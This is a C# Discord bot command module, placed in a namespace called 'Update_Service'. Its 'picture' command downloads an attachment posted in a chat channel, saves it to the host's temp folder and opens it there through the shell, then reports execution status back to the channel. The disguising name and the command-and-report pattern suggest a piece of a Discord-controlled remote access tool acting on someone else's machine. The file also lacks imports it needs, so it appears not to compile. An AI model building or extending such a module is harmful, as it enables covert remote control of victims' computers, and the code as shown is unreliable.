using Discord.Commands;
using Discord;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Update_Service.Commands
{
    public class ChatCommand : ModuleBase<SocketCommandContext>
    {
        [Command("picture")]
        public async Task PictureCommand()
        {
            if (Context.Message.Attachments.Count > 0)
            {   
                var attachment = Context.Message.Attachments.FirstOrDefault();
                if (attachment != null && Uri.IsWellFormedUriString(attachment.Url, UriKind.Absolute))
                {
                    await PreviewImageAsync(attachment.Url, Context.Channel);
                    return;
                }
            }

            await ReplyAsync("Please attach an image file to the command.");
        }

        private async Task PreviewImageAsync(string imageUrl, IMessageChannel channel)
        {
            try
            {
                using (var client = new HttpClient())
                {
                    var imageBytes = await client.GetByteArrayAsync(imageUrl);

                    var tempFilePath = Path.Combine(Path.GetTempPath(), "preview_image.jpg");
                    File.WriteAllBytes(tempFilePath, imageBytes);

                    var psi = new ProcessStartInfo
                    {
                        FileName = tempFilePath,
                        UseShellExecute = true
                    };
                    Process.Start(psi);
                }
                await ReplyAsync("Command Execution Completed: Image Previewed");
            }
            catch (Exception ex)
            {
                await channel.SendMessageAsync($"Command Execution Failed: {ex.Message}");
            }
        }
    }
}
